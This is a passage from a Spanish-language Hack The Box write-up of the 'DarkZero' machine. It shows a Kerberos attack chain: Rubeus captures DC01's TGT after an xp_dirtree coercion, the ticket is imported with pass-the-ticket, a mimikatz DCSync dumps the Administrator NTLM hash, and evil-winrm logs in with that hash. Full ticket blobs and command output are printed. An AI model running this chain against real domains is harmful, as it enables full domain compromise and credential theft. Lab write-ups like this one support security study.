    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uRVhUo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD4qsWb5Uah8IMwMEdpArEA5anosKIM7RxPQsEom1s5OUW7Ewen4CGd9nGTVZoGqcU+siyJt7lwnemZ0xvj+sdD89BEWIdVlOIKuyn7omkhNEyCvwW46LV55z5JUuQsO4S3BTStJAYQjLXoVmAjBGFP/6LzVhHq1LROOTW9ySl6XDIvc47IE3gmFJ/6OE0gXndelnV/Dnbz5nCWiBMG3NAYVYPxwpXHhLA8DIj34dbCCHDykhX6gkD31E98dCdeWqYg9It8/pRLYgq51AK+wySBo1vXgGz+epvOjlF4pYh9jvbu//CaVmlyK63RbwH7S/2emLisoJIcMU5iJtEk276JQDnKngW3tQh+SBP1mXDkhTO9zjU3X1ZvPk7hcLNdqGR6/soUjDM8I6hDWoLM074V20dj9d/HfcYSfXJYA0/SIn6DKmCxrljDilf463TVWkEo+M818PY4jpdlibA/maS7zfiDJH9Y7mCC/6vU5i5b7l/+hugaXthhxMnhL66qMKguioXv5ZWHv3zjOGR/dPgI9l7bGBj9EITtTMedRTT4ZhZyqJ6vv3r5J9rITFtKNX1g72DuUtvkTMEgGnPyn/Mk5r0O7cqQOn4UIAhDtwTg5XnyTNmjC8A3ofPfdEfIdqt80i74urhR/i5lmDQQ9heKQu3Y9PUoTlKmB6NhJD6TCqAh00U/PzAzgdw5qKL/sdwYQ6HhlbHxm/E/BNRlJe+n4PSOcBamQxJ0Jt7LwHUcnVSVmMROQ3wwsy8Xtuzy2WpEtPP0MY4wc1hsvBoGDVfuNJrDaMWnIJ7IppOQmpNd83JIC0ju+G8PklvD+GjmAxghWJIUXMG5Ac+zmBcABu51gjMP6W2rde5KDQEXVVvdm2/7sYOxZTfRN2LVIVVlbiQrAOqcKuTuXa8+ucDK0SPwDhR+GFp+/TgtyKD2f5buPPgrtfmw87XRK6x+CIidS2LRJE4N5N2+kJ7dWfrruBcZMsHsAppAsoYWwpMrF+sWIA2aR1mtY6rIgCT/2v+BnUFMRicI1pT37/UGW3vM+h79ZNATjYYH21bcvw/5Cj6cTYjvZty3pd3R5Pn2V64o2E1CnYymGf9Z8ebkRPV52z6b6pv5VNhYKEUN06pG5rhqsf0m97aPdkstBWVn4McaRiXQZnQQWYMpmrCPuzl8f846J1FlyJjNYZmz+F5oD5j/7ze4x2hG4Wu9BVL95hlZu2RNH3Zc2PP8arTDpgiWW+qT466HrN0Vc9qeLmpZgqf7kND+iCZEfmEqkIl6S1PziGCnSE+UX3t22gYNWStiGaQyWX4KesswmL2GvqJmt/92hl6FsrpHFXYz+RFRVPsFN6UiHAb7hMl1pU530qmAJysDweDwJR7OLtijrxn41E0UyLMwyNU0SxXQoNX7zAL6dbKtPiO5qcR3aelbIUYuOfmyja+3a5We7UUt1d4bbI6ujgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCBFknUkpLva3B8av6WEVMKl6SvrdEfY0K/y6nJDCzscsaEOGwxEQVJLWkVSTy5FWFSiEjAQoAMCAQGhCTAHGwVEQzAyJKMHAwUAQOEAAKURGA8yMDI1MTAwOTE3NTIwNFqmERgPMjAyNTEwMTAwMzUyMDRapxEYDzIwMjUxMDE2MTc1MjA0WqgOGwxEQVJLWkVSTy5FWFSpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDERBUktaRVJPLkVYVA==


[*] 10/9/2025 6:06:09 PM UTC - Found new TGT:

  User                  :  DC02$@DARKZERO.EXT
  StartTime             :  10/9/2025 10:47:21 AM
  EndTime               :  10/9/2025 8:46:56 PM
  RenewTill             :  10/16/2025 10:46:56 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uRVhUo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD5F8D8Nyzamrba28hlceBMXKvhjqjHgHtntOu1p1gyQYTJ8e3gxh9ppCQbHnvs/hkHX/r2X289ZXN+YcbSmnSXPWgLl116UhlBI30HT31uxWh55Gdht64FminG9pICzmn6H11+HQTAuyxy/OCXlrapqFYeqrYtgLh86Fc2fgZRdl4jJChL8ItMtt7uumKcwx/Y8ujb/gLE+G2uKGF818qlaL9j4cxD1GGXSk83P+uBMaCyiTHuZy3TXmn/y75zcJWOcTeVlVvyQYtl269D1KMnL+z0ansJYldSv1uAZxFJnKkgtgvojVQR5NUChghBDazx5zC2gBYB9x8hqaTrICKrkMWx6MfBnYwk2LHNRQ6iXWoA9C06yS5KNVrvZEqKR7DuW5UthvsOWJUkyRubXHhThxhBcDL4YKx2r+Wn4Xn9L1IYC3V01u+C4yZUOrkBB64jDCfO2jc/Zz2KuTV29qvfISjCKHrdnuO2ndXxEnRTmkzGPwQLlxUQ9cEjA6ybjJ9N2hD+kzrkz1zFBH8Su75r6TEoV1gh66KYa8OD23vxYih+R7F7xUviwiSlwMtHfGKiIoqXzokWeeIAeWSE14/wvIo2cae3kwNkvHZQqJGZG/XxdbeC8Ee7TZU1htxmwxNG7mysG/uzLcBHpL6jHZyUTk8ShAjAkfRGMbtyy1RaEwovWe2wyCvLpGs4xEhCutwMWz5QsJRFVNjvnSSbo1DrgQGPB1h9YSZB08JtwvejwUF1r7KcSy0BthnQ4T2qv5S7fc7OFfpAqvpPte6h2xkZgtix8Uh7BGVVsh2vnvocHWCh9FMGd5sNYLvb7Dz9qJrX+UZmiav5LDPcREaUQXjnR1aVsEe++scLj/Tlr833PjOWuuMBMcOVO6TU8NtAFHcYHWLYrugS7JFRRaG33h81KetVxGbqvZJ+qg/hdTD53NCCbpnqwCzRda2aTk1QMiZa1AJZBA79o6AY67ovqH0xVy4ScIN2QbWMhtoIrH7aywz12DWMRowJh8czF5BZFKizvqmkptLJ1Q9DHpQh3oB+QBQ8Gupfpjt4BgopBUoj7Ks2A+28OOGkO4xL0epKbQ1g0ZrFoPKgUEG8rhPiFfVeHptY87ihPBQ7ovGskXylJGcVnY8QTWW2bKgjJc+xhng6/JjEJxIVt2dRd0ZHL1STH9ZIa2KcijGmjRn0st4GQsl996XAr9NyZwGx9Wmh19oV7GrldCq/J6leI5CDlpzJtaUSAeJ7MH0QMXv4ZhjqLUlLLT1prIbK3afAqjj4UJjgzi2ghNcPc8ckPFLs7czIK6kmCu+o35wsCMcO+MfPN234rnjqjlyb+JEMveiYd/AdWvNWomMZ2uEC16Pi/QkU5foHxrtVdmWqQcbZao2eK8PtfRFKm8oN6oKkisWKCZyQZpuGkSR1YYxYqsHjN8F/R7RckPo4xit8dl4b/zDOjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCD5AntRCwej8E658F4fQPH4QcMmY3iRRircIxOz/2PwHaEOGwxEQVJLWkVSTy5FWFSiEjAQoAMCAQGhCTAHGwVEQzAyJKMHAwUAYKEAAKURGA8yMDI1MTAwOTE3NDcyMVqmERgPMjAyNTEwMTAwMzQ2NTZapxEYDzIwMjUxMDE2MTc0NjU2WqgOGwxEQVJLWkVSTy5FWFSpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDERBUktaRVJPLkVYVA==


[*] 10/9/2025 6:06:09 PM UTC - Found new TGT:

  User                  :  svc_sql@DARKZERO.EXT
  StartTime             :  10/9/2025 10:48:31 AM
  EndTime               :  10/9/2025 8:48:31 PM
  RenewTill             :  10/16/2025 10:48:31 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFgDCCBXygAwIBBaEDAgEWooIEhjCCBIJhggR+MIIEeqADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uRVhUo4IEPjCCBDqgAwIBEqEDAgECooIELASCBCiimhSxOcRuXh0swT1wsTU0hzl6u4RSe7Zb5SadPInXViENCmKNvY/FQ4+hgI0bmQCM3G7Kr9zulto062nJAcD7W0qXSIIT4D6TwtNzhLKf+eQI006nPZIuaVHZVGUgETC7A25R8MX7ukz/JMQ9qXtrYXwXXoFRDznoZVpBgkJwBaMY777gNkhY+DVAPoEa/Zr8M4P62FcwZQKYEZSYUdP6MiO3xeq4RCBQQh8nhDAZhHjDGMJYq4kWRgVcGU1VykQTiuP/ThDgueGMYHiyG2yvphn/ql5yWEzZ+pvcoU+s6wGImSkjfBu6Ax7YMNEJpp9rsRvZCUIucw0+xmysgzyaJN9BOldEjvnNBz9YTfeJMHkgN38VDuju4AsUZ6bVndOlMVfa222eXYVtRJ6PIU0Jl+4h4TPoHZsezhGq72i3mdL3qvorOO+xxVb7Bbt1I2BV8BlS/hw+a27AmygG2k8ILmjCsxFdR34VTQHzP/VvWJMcacwQRspSGNCtTctJugnlWGBdp1b7w6Y26PuzallRQ14ZhxveQkpG8AS68kGFFLk2tD9izTZwsj9+RTlaBtcjKw7+gq0JvTSuDSc9+lvO+6bbifZ+m8xts5OXWfsd+7SxEpJ4Z5hmHBz/9+lGA4FfGOscKp3KcExc5flPs63xx7C1TXusvARhUKKKQ1zKVMB9PdHoVQWLmv1IMunssZqJzHKonqfyWF2JMxh4p0o2nSkRj3TnVj5NYsXYBksVIK+ffl16fbNtrgM25AIFyu/jdiUoxPsIkHmaBc6queKBCnmmgGqlwI7QhOELBktkRHpajIDeQRNGJHsVeKNOb+Ym9IVkpDsX7AQga1/Cje7HaeJ6Ut1od/Wih+nIijVLecd18EfpdMr0AJSEfUqVt0QP6jYnHBUfJdVoGLPDrj4GQgOA0gM8+uM3xhkYSdOphdmCkkGr7eM835v4v/ahjr4c7fIoECZ9vEYZ4/z6zvemeCCq9qyOZDSGBx8ChIeTS3V3dFDvpTy71RawaPP/aX2U+8qTBA3ED2Iun1tR4R8bf9ap+P74OOmvTnLUhTROI3rccuEZMqc553ucujnjRUCrMgBCcWSHNVIw47haSw0a0E9kiwOYPz7tt7AJMXS9vbfKHkDHkTgc1sIc/GqhMp/Kl7xhZtWDl1NMaDI1hQNNSACnbHr8fAP650Ve75AYmNcTYe3VDs67uFD13zxDm4h9/PSEJ5+LfoJlVgMDpOdLTBVXBerXrAjgKQnWaigc/7JnpNEWNNSvlFWnS8wsh1w/WzM474t9v7LW4NdbL4P67V5FBlKMHy4QHHOKbNZcFFJC6wIigTnMMs+62pXEW396EWUKyUohA22j+m3kX5kfdYnzfLv7omgw8bPSLpUbezxXyBidBVdLLP9wTrup12iHytIhBu9YnaOB5TCB4qADAgEAooHaBIHXfYHUMIHRoIHOMIHLMIHIoCswKaADAgESoSIEIHSGj2G6bHc/A/1Up5Csj9vnu8PUgjjV9/G0dK2VKI8ZoQ4bDERBUktaRVJPLkVYVKIUMBKgAwIBAaELMAkbB3N2Y19zcWyjBwMFAEDhAAClERgPMjAyNTEwMDkxNzQ4MzFaphEYDzIwMjUxMDEwMDM0ODMxWqcRGA8yMDI1MTAxNjE3NDgzMVqoDhsMREFSS1pFUk8uRVhUqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5FWFQ=


[*] 10/9/2025 6:06:09 PM UTC - Found new TGT:

  User                  :  DC02$@DARKZERO.EXT
  StartTime             :  10/9/2025 11:00:58 AM
  EndTime               :  10/9/2025 8:46:56 PM
  RenewTill             :  10/16/2025 10:46:56 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwardable
  Base64EncodedTicket   :

    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IEVDCCBFCgAwIBEqEDAgEBooIEQgSCBD7KKCBIxIlOctD5G8lfs9IngsrcGE/nCncLtVPdC9srnOFaygOwXOITeuMZkLZaVAGGcKnYyV1QlTmQM+UFG6hbSwXFszqz2pmLjubECA/QZ8HiwAWk1RBmAPJ/4qo+mfOvnwdxHB9/Ha4drZXndhc4e/EdkiNAhVmaVInegv87F0LUqbAQUJyf9TO4qIAzHWRw9iuHxCz81O9wmDAh/3zg/kwfY91WOp5Tsj+Ijuj1cArVNos64OHvXZ/GjglOQVzKm5JSCF+r3D7l/neFGgVf6hM03SzrPefIIvspe6cRxlrz3ZGfDhmA9DG9qIQM0UcYeZa9vGKkq9ylGpDG5HQ8lz6EYI/RqVzF0YgfpQIz161C21kyj77+FYt18axM1D0GzGAl13hkABETrOIqjnFqmlAE6PjYiI5UqX/OKc3IJCHEVauguY7fuN4wwgNt8jOTsdRMNbacXap2H3kHC6WaW/5fEMU6hXkI24LCbYk16/0zsSCtX9l5tQZFRz/2dCLO7muhL5m5ZEyuEgxxeO+elfL+NzgoH5eq7DGCy/EfuaoAK1OZlAddslBq2C9oPAxrWnjgHdeJxvJMKHxNuZvrcca8vtnYRq13T+RKqboSUIDIyrXbh+x3ymz3p+mK1ur4CVrngywJ3EfIG52AHEU3BmYFQrtcZE3t3L+VjrfUAPD2ytHbWB+D6uekDxvqO45mnzimcUACBkGBtxRkcAmC8JxQ+XjT+vqdKXdkJ3XgWn+cL71FbM6xPkvMntTfcWlx4FIWUUcSWExdci3jSb4HTBKdNpXbEXjUv1xx6X8QtsJ8WH5sVk9cWzmOHYSSs9wPMKc372EXfMj9a11DXyK8GUfY3TUSq3iMCdAEplg/zSGWXS+k7Yc7sPOsgGw7lw5E7nxNMhWYj/SVRmNSUY/5Bgft4uirRlpLOWMfiNVptuIj6a5h64YYXq2AQoJPbM/uNNkVOX8KoysA3BLUSnxLQ0Izox5ZBbziD/WZQRqoEA44qwyXFdxWFL6WrwSoaB8c3QjSUnlccBBy/ngWx2D9uYPXhKmqI//VOaLKul3iZV71LQDq88CUT6UkJ7ZoncCYV9jsKiryNhXlJiB4cMSmwKCh8+tMFarxarzRs64YtAi0eb+jjBjvv5z3splZa2fndc3amnzCbVC090ZBtKddtP+TmUZUdnkl03nYVFYJmEYe/naIZNEYooojKjY9JWOm2VkKWJ88WRROaQePpbWdQTGEIOMmRP9ggj0RvUtgao4DbeUkxWYZYGQouiQ5m7fZZESDMdNUobeeQsjCJL4d7irTQrTsLLzyep+n5/RQXatTmAVwCVrx5B62ifiKhXcQH58V+GSmHzJo/eAzrK3aeUtAHZR72/aPTzhg3qj8jDJ4Jk4ZisKyc7CuCkF/YsHj4kbVLX8AVB5dR8xZoMG65UgRwpX5KLx3ODC/2JOjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCCRgvTXQX2sIcRHbg064yJKdUJ0iCUlPCOess+jYJzvO6EOGwxEQVJLWkVSTy5FWFSiEjAQoAMCAQGhCTAHGwVEQzAyJKMHAwUAQKEAAKURGA8yMDI1MTAwOTE4MDA1OFqmERgPMjAyNTEwMTAwMzQ2NTZapxEYDzIwMjUxMDE2MTc0NjU2WqgOGwxEQVJLWkVSTy5FWFSpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDERBUktaRVJPLkhUQg==

[*] Ticket cache size: 6
```

Veremos varios pero ninguno es de `.HTB` del dominio principal, todos son `links` por asi decirlo en contenedores aislados, esos no nos interesan, por lo que vamos a obligar desde `sql` a generar un `TGT` de `DC01` para que lo capture `Rubeus`.

```shell
xp_dirtree \\DC02.darkzero.ext\test
```

Info:

```
subdirectory   depth   file   
------------   -----   ----
```

Pero si nos vamos donde tenemos la escucha de `Rubeus.exe` veremos lo siguiente:

```
[*] 10/9/2025 6:12:43 PM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/9/2025 11:12:43 AM
  EndTime               :  10/9/2025 9:12:42 PM
  RenewTill             :  10/16/2025 11:12:42 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDa1lbHpJ/dfvflhNqLy0ckx2OKWtG0D3oiJUAcANaG8uKJ3T86f0MZED6UXrI3sywbO0eadcfJDAx8wrWwks910COCleROoG9mH5gb1ubEUVuf5LkiEXk7tz88plwfV9L+dMzRxzQ14X/ndaOfXeZDDIeiNX33KH0h/oL9d2YfT8saXjEUYxqUS7X3HmQvLGO+vICfstnUPdxTF6fzaHmj5qsb7t6elICouY5P3ZaSrigSYwbgSqBGSMaLONPL+uhQLiAsHF3rTELEKQOW3WZUkPkxYHlxXagkXQuWo2k+n0ACPjMKyJK+KXsvEWnTLIqqSAMxw3LdgvBWieOzXAgLajJWUDeX9AGpm+62/GR+B0YA0EpXnRCS6qsgE5xmuRMiT7zSEoctsz8CUvJW/JnFJMlBgRBVfbFb9qqPnAPEl2s5FG1Shvp5Sn1FDH+hCEQeiRFbEkBClq+WxCItjKHzs7PVUPgbcVnYZdYtlE0Pq6ZPDy6JDYENPuRc/pA+bm6yUZTQ/y5fPLvz+zCM75NkDYnbSfGvBkRxMx7e9kkqLAfs0r5HJ43MgkDyIIb7Zmik3gV0cPNtcjl2fxEb+cmpAJj8tT8igZdKdH8HpG4ePLNZyh41gfty3bGUfhzjaLzT8Y9AH8WDLWdFPzOCGB23wJP9uDYpHKH3fqG/5UH1L0/UGToB6WnLCRRfecC9xLLBEVzy/W4DN+1wKWltehYzPmmfko/mD7hudXzag/XcGboFQsoVyAMA2YBQSES7JWAlncAEeR3W7u3HFuPdNF2ZfgANO8lvYIb89HN1uqmARK/gkglryxoUMj6EhK3W6kUtod7Hwo3KYVR4DUuIqh3lDjc59vscGfCcLWsZpnkty9cPMuTqYdLq1ah3+9f2ce2D5dXpAIa9YMErFEAE+Xv63E6fN3BcuzNsea6ATsZNczPGj2WE25GlwM8d67oOMBtiX+x/HUl/R5Uow/i9s2eMFZrcOYr8pkgcFXJ8X6c1tQy1Rs189BRYezutpkT5N6tOCi4OLk7sTpszSqtfaYEnkh0zOrSIvU6uo4luIceBju68fnW1tJoovVkFnKHo88IIHoTXwdw997aDT3dBOVKTwWhxNbuIdGIR8A/WIDHT65xC6iuq/QoThP36EWaA8gAg3FQtHzkWzr+IV11jjvJlUomKbRtBOcGFVLe4HwrU/rvKk5RmeZSo8/FkracNQKn2VCtERqYgonDUjlob9IdUdZhlmt8z2yqtoTZpPEBnfMRwKxJmkJ+U2hRmhr0zzYI8cbUheCRFTacVUgfJGkTMSF+4TdsYEgthlaxCauGrY0yyPGUT2I+fEZONB3F1hJwCaItGviCpfoeRhvD+0YQ/RWaptaCFG1d/CguAC3QcgetdMQLcvPwTni11hGee4HOvMcglo5a1+sRrodpZUT1qg8eZydAKQo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgXIg2K8w6CFko1BBTDCs+aKI1VAcgpCkioIgMQZItRoahDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDkxODEyNDNaphEYDzIwMjUxMDEwMDQxMjQyWqcRGA8yMDI1MTAxNjE4MTI0MlqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=

[*] Ticket cache size: 7
```

Vemos que genero una nueva entrada con el `TGT` de `DC01` y vemos el `dominio` que es `DC01$@DARKZERO.HTB` este si es el que nos va a servir, ya que tenemos `Rubeus` en el mismo directorio de `windows` vamos a cargarle ese `Base64` para que importe el `ticket` capturado del servicio de esta forma:

```shell
.\Rubeus.exe ptt /ticket:doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDa1lbHpJ/dfvflhNqLy0ckx2OKWtG0D3oiJUAcANaG8uKJ3T86f0MZED6UXrI3sywbO0eadcfJDAx8wrWwks910COCleROoG9mH5gb1ubEUVuf5LkiEXk7tz88plwfV9L+dMzRxzQ14X/ndaOfXeZDDIeiNX33KH0h/oL9d2YfT8saXjEUYxqUS7X3HmQvLGO+vICfstnUPdxTF6fzaHmj5qsb7t6elICouY5P3ZaSrigSYwbgSqBGSMaLONPL+uhQLiAsHF3rTELEKQOW3WZUkPkxYHlxXagkXQuWo2k+n0ACPjMKyJK+KXsvEWnTLIqqSAMxw3LdgvBWieOzXAgLajJWUDeX9AGpm+62/GR+B0YA0EpXnRCS6qsgE5xmuRMiT7zSEoctsz8CUvJW/JnFJMlBgRBVfbFb9qqPnAPEl2s5FG1Shvp5Sn1FDH+hCEQeiRFbEkBClq+WxCItjKHzs7PVUPgbcVnYZdYtlE0Pq6ZPDy6JDYENPuRc/pA+bm6yUZTQ/y5fPLvz+zCM75NkDYnbSfGvBkRxMx7e9kkqLAfs0r5HJ43MgkDyIIb7Zmik3gV0cPNtcjl2fxEb+cmpAJj8tT8igZdKdH8HpG4ePLNZyh41gfty3bGUfhzjaLzT8Y9AH8WDLWdFPzOCGB23wJP9uDYpHKH3fqG/5UH1L0/UGToB6WnLCRRfecC9xLLBEVzy/W4DN+1wKWltehYzPmmfko/mD7hudXzag/XcGboFQsoVyAMA2YBQSES7JWAlncAEeR3W7u3HFuPdNF2ZfgANO8lvYIb89HN1uqmARK/gkglryxoUMj6EhK3W6kUtod7Hwo3KYVR4DUuIqh3lDjc59vscGfCcLWsZpnkty9cPMuTqYdLq1ah3+9f2ce2D5dXpAIa9YMErFEAE+Xv63E6fN3BcuzNsea6ATsZNczPGj2WE25GlwM8d67oOMBtiX+x/HUl/R5Uow/i9s2eMFZrcOYr8pkgcFXJ8X6c1tQy1Rs189BRYezutpkT5N6tOCi4OLk7sTpszSqtfaYEnkh0zOrSIvU6uo4luIceBju68fnW1tJoovVkFnKHo88IIHoTXwdw997aDT3dBOVKTwWhxNbuIdGIR8A/WIDHT65xC6iuq/QoThP36EWaA8gAg3FQtHzkWzr+IV11jjvJlUomKbRtBOcGFVLe4HwrU/rvKk5RmeZSo8/FkracNQKn2VCtERqYgonDUjlob9IdUdZhlmt8z2yqtoTZpPEBnfMRwKxJmkJ+U2hRmhr0zzYI8cbUheCRFTacVUgfJGkTMSF+4TdsYEgthlaxCauGrY0yyPGUT2I+fEZONB3F1hJwCaItGviCpfoeRhvD+0YQ/RWaptaCFG1d/CguAC3QcgetdMQLcvPwTni11hGee4HOvMcglo5a1+sRrodpZUT1qg8eZydAKQo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgXIg2K8w6CFko1BBTDCs+aKI1VAcgpCkioIgMQZItRoahDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDkxODEyNDNaphEYDzIwMjUxMDEwMDQxMjQyWqcRGA8yMDI1MTAxNjE4MTI0MlqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=
```

Info:

```

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

Veremos que lo hizo de forma correcta, por lo que si listamos los `tickets` que tenemos en `cache` veremos que esta el que nosotros importamos desde `Rubeus`.

```shell
klist
```

Info:

```
Current LogonId is 0:0x3e7

Cached Tickets: (4)

#0>     Client: DC01$ @ DARKZERO.HTB
        Server: krbtgt/DARKZERO.HTB @ DARKZERO.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
        Start Time: 10/9/2025 11:12:43 (local)
        End Time:   10/9/2025 21:12:42 (local)
        Renew Time: 10/16/2025 11:12:42 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY 
        Kdc Called: 

#1>     Client: DC01$ @ DARKZERO.HTB
        Server: krbtgt/DARKZERO.HTB @ DARKZERO.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
        Start Time: 10/9/2025 11:36:22 (local)
        End Time:   10/9/2025 21:12:42 (local)
        Renew Time: 10/16/2025 11:12:42 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x2 -> DELEGATION 
        Kdc Called: DC01.darkzero.htb

#2>     Client: DC01$ @ DARKZERO.HTB
        Server: cifs/dc01.darkzero.htb @ DARKZERO.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a50000 -> forwardable forwarded renewable pre_authent ok_as_delegate name_canonicalize 
        Start Time: 10/9/2025 11:38:02 (local)
        End Time:   10/9/2025 21:12:42 (local)
        Renew Time: 10/16/2025 11:12:42 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0 
        Kdc Called: DC01.darkzero.htb

#3>     Client: DC01$ @ DARKZERO.HTB
        Server: cifs/DC01 @ DARKZERO.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a50000 -> forwardable forwarded renewable pre_authent ok_as_delegate name_canonicalize 
        Start Time: 10/9/2025 11:36:22 (local)
        End Time:   10/9/2025 21:12:42 (local)
        Renew Time: 10/16/2025 11:12:42 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0 
        Kdc Called: DC01.darkzero.htb
```

Ahi lo veremos el numero `3`, nos saldremos de la `shell` de `Windows` para entrar al `meterpreter` de esta forma:

```shell
Ctrl+C
```

Le damos a `y` y veremos de nuevo nuestro `interpreter`:

```
Terminate channel 1? [y/N]  y
meterpreter >
```

### mimikatz

Ahora vamos a cargar desde `meterpreter` `mimikatz` de esta forma:

```shell
load kiwi
```

Info:

```
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

Una vez cargado y teniendo el `ticket` cargado que hizimos con `Rubeus` vamos a obtener toda la informacion del `dominio` `darkzero.htb` gracias a dicho `ticket`.

```shell
kiwi_cmd "lsadump::dcsync /domain:darkzero.htb /all"
```

Info:

```
[DC] 'darkzero.htb' will be the domain
[DC] 'DC01.darkzero.htb' will be the DC server
[DC] Exporting domain 'darkzero.htb'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : darkzero


Object RDN           : LostAndFound
.............................<RESTO DE INFO>.......................................
** SAM ACCOUNT **

SAM Username         : Administrator
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-1152179935-589108180-1989892463-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 5917507bdf2ef2c2b0a869a1cba40726

Object RDN           : BCKUPKEY_67ac8b2c-37f4-4d72-b6e0-9b8806d85af1 Secret
.............................<RESTO DE INFO>.......................................
```

Veremos que nos saca la informacion del `admin` por lo que vamos a probar a conectarnos por `WinRM` con el `hash` `NTLM` de forma directa.

### Evil-winrm

```shell
evil-winrm -i <IP> -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Veremos que ha funcionado, seremos `Administradores` por lo que vamos a leer la `flag` del `admin`.

> root.txt

```
24a2347ade87490910db4abb593507d8
```
